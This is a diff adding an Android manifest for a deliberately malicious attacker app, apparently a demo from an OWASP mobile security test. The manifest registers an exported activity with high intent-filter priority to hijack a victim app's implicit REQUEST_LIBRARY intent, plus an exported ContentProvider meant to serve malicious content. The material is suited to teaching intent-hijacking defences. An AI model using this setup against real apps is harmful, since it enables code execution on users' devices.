@@ -1,0 +1,37 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.attacker.codeexec">
+
+    <application
+        android:label="LibraryProvider"
+        android:theme="@style/Theme.AppCompat.Light">
+
+        <activity
+            android:name=".AttackerMainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <!-- Intercepts the victim's REQUEST_LIBRARY implicit intent -->
+        <activity
+            android:name=".EvilContentActivity"
+            android:exported="true">
+            <intent-filter android:priority="999">
+                <action android:name="org.owasp.mastestapp.REQUEST_LIBRARY" />
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </activity>
+
+        <!-- ContentProvider that serves malicious content -->
+        <provider
+            android:name=".EvilContentProvider"
+            android:authorities="com.attacker.evil"
+            android:enabled="true"
+            android:exported="true">
+        </provider>
+
+    </application>
+</manifest>
